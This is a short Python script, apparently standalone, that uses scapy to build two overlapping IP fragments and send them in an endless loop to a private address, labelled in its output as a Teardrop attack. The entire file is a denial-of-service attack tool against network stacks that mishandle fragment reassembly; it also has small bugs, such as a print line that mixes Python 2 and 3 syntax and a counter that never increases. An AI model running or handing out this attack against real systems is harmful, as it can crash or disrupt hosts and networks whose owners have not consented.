from scapy.all import *

def teardrop(packet1, packet2):
    sendp(packet1)
    sendp(packet2)


eth1 = Ether()
ip1 = IP()
ip1.dst = '192.168.199.100'
ip1.flags = 0x1
ip1.frag = 0x0
ip1.len = 56
udp1 = UDP()
packet1 = eth1/ip1/udp1

eth2 = Ether()
ip2 = IP()
ip2.dst = '192.168.199.100'
ip2.flags = 0x0
ip2.frag = 0x3
ip2.len = 24
ip2.proto = 0x11
packet2 = eth2/ip2

m = 0
while True:
    teardrop(packet1, packet2)
    print ('Sending TEAR RROP Packets To %s') % ip1.dst
    print(m)
